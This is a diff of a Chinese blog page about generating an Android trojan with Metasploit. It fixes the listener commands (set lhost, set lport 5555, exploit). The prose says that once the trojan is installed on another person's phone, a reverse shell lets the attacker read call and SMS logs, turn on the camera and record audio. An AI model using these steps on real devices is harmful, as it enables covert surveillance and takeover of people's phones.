@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/7T~RA4%29%2894%7D1F$G%7BG23_1U4.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/QWTDWS%7D8R8RY6QA0$%7DK%7B_5S.png">
 <meta property="og:image" content="http://oo1re7zx4.bkt.clouddn.com/14HZQM%259%5BZR3S$L27I%5B3NK7.png">
-<meta property="og:updated_time" content="2017-04-07T16:45:43.476Z">
+<meta property="og:updated_time" content="2017-06-10T08:09:36.531Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用kali和pentestbox下的msf生成安卓木马">
 <meta name="twitter:description" content="Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。">
@@ -201,7 +201,7 @@
 <p>注：pentestbox命令一样</p>
 <p><img src="/img/7.png" alt="img"></p>
 <p>从上面的图片我们可以看到，我们还没有设置要侦听的IP和端口信息，所以我们设置端口侦听。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">rhost</span> 10<span class="selector-class">.20</span><span class="selector-class">.72</span><span class="selector-class">.178</span> <span class="selector-attr">[这里设置的监听IP和刚刚生成的木马IP一样]</span></div><div class="line"></div><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">rport</span> 5555 <span class="selector-attr">[设置刚刚生成木马的端口]</span></div><div class="line"></div><div class="line"><span class="selector-tag">exploit</span> <span class="selector-attr">[开始监听]</span></div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">lhost</span> 10<span class="selector-class">.20</span><span class="selector-class">.72</span><span class="selector-class">.178</span> <span class="selector-attr">[这里设置的监听IP和刚刚生成的木马IP一样]</span></div><div class="line"></div><div class="line"><span class="selector-tag">set</span> <span class="selector-tag">lport</span> 5555 <span class="selector-attr">[设置刚刚生成木马的端口]</span></div><div class="line"></div><div class="line"><span class="selector-tag">exploit</span> <span class="selector-attr">[开始监听]</span></div></pre></td></tr></table></figure>
 <p>当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。</p>
 <p><img src="/img/8.png" alt="img"></p>
 <p>这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。</p>
@@ -589,11 +589,15 @@ var _hmt = _hmt || [];
             </li>
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>欢迎友情链接</a>
+              <a href="http://白帽黑客.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>白帽黑客Blog</a>
             </li>
           
             <li class="search-li">
               <a href="http://边缘.ren" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>边缘人</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>欢迎友情链接</a>
             </li>
           
         </ul>
